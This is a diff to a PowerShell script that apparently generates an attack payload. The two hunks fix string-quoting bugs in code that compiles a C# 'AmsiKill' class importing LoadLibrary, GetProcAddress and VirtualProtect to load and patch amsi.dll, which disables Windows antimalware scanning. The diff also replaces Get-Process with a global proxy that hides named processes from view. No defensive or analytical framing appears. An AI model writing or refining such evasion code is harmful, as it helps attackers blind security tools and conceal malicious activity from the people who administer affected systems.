@@ -449,7 +449,7 @@ Set-StrictMode -Version Latest
 # Note: We cannot nest a here-string inside this @"..."@ block, so the C# source
 # is passed as a regular escaped string instead.
 try {
-    `$csSrc = "using System; using System.Runtime.InteropServices; public static class AmsiKill { [DllImport(`"kernel32`")] public static extern IntPtr GetProcAddress(IntPtr h, string n); [DllImport(`"kernel32`")] public static extern IntPtr LoadLibrary(string n); [DllImport(`"kernel32`")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o); }"
+    `$csSrc = 'using System; using System.Runtime.InteropServices; public static class AmsiKill { [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n); [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n); [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o); }'
     Add-Type -TypeDefinition `$csSrc -Language CSharp -ErrorAction SilentlyContinue
 
     `$lib = [AmsiKill]::LoadLibrary("amsi.dll")
@@ -478,7 +478,7 @@ try {
 
 # Hide process list via Get-Process proxy
 # Note: Join-String is PS7+ only; use -join for PS 5.1 compatibility (Server 2019 default)
-`$hideNames = ($($HideProcessNames | ForEach-Object { "'$_'" }) -join ',') -split ','
+`$hideNames = @('$($HideProcessNames -join "','")')
 function global:Get-Process {
     [CmdletBinding()] param([Parameter(ValueFromPipeline=`$true,Position=0)][string[]]`$Name,[int[]]`$Id,[string]`$ComputerName,[switch]`$IncludeUserName,[switch]`$HasExited,[switch]`$FileVersionInfo,[switch]`$Module)
     Microsoft.PowerShell.Management\Get-Process @PSBoundParameters -EA SilentlyContinue 2>`$null |
